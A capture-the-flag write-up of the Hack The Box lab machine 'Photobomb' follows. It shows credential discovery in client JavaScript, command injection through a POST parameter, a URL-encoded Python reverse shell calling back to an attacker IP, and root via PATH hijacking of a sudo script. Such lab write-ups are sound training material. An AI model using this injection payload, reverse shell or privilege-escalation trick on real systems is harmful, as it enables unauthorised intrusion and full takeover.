# easy - Photobomb

## User flag

Webserver info:

```bash
~p» curl -sI http://photobomb.htb/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 02 Dec 2022 02:39:14 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 843
Connection: keep-alive
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN

» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.119
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

At first glance, found some creds:

```bash
~p» curl -s http://photobomb.htb/ | grep src
  <script src="photobomb.js"></script>
~p» curl -s http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

There is a page where we can download image files via HTTP POST with different parameters (3), one of them has remote command injection:

```bash
curl \
  -X POST \
  --output foo \
  -H 'Authorization: Basic cEgwdDA6YjBNYiE=' \
  --data-raw 'photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg;ping%20-c%202%2010.10.14.18&dimensions=30x20' \
  'http://pH0t0:b0Mb!@photobomb.htb/printer'

# Another window listening tcpdump icmp
» sudo tcpdump -i tun0 icmp
23:00:38.414678 IP photobomb.htb > layer0: ICMP echo request, id 5, seq 1, length 64
23:00:38.414691 IP layer0 > photobomb.htb: ICMP echo reply, id 5, seq 1, length 64
23:00:39.297405 IP photobomb.htb > layer0: ICMP echo request, id 5, seq 2, length 64
23:00:39.297445 IP layer0 > photobomb.htb: ICMP echo reply, id 5, seq 2, length 64
```

Getting a reverse shell, thanks to: https://www.revshells.com/

```bash
PY="export%20RHOST=%2210.10.14.18%22;"
PY+="export%20RPORT=5555;"
PY+="python3%20-c%20'import%20sys,socket,os,pty;"
PY+="s=socket.socket();"
PY+="s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));"
PY+="%5Bos.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)%5D;"
PY+="pty.spawn(%22sh%22)'"

curl \
  -X POST \
  --output foo \
  -H 'Authorization: Basic cEgwdDA6YjBNYiE=' \
  --data-raw "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;${PY}&dimensions=3000x2000" \
  'http://pH0t0:b0Mb!@photobomb.htb/printer'

```

```bash
» nc -lvnp 5555
Connection from 10.129.36.119:59122
$ pwd
pwd
/home/wizard/photobomb
$ id
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)

wizard@photobomb:~$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh


wizard@photobomb:~$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;


wizard@photobomb:~$ /opt/cleanup.sh
/opt/cleanup.sh
chown: changing ownership of 'source_images/voicu-apostol-MWER49YaD-M-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/calvin-craig-T3M72YMf2oc-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg': Operation not permitted
chown: changing ownership of 'source_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg': Operation not permitted
```



## Root flag



```bash
wizard@photobomb:~$ echo "/bin/bash" > find
chmod echo "/bin/bash" > find
wizard@photobomb:~$ +x find
chmod +x find
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# ls ~/
ls ~/
root.txt
```

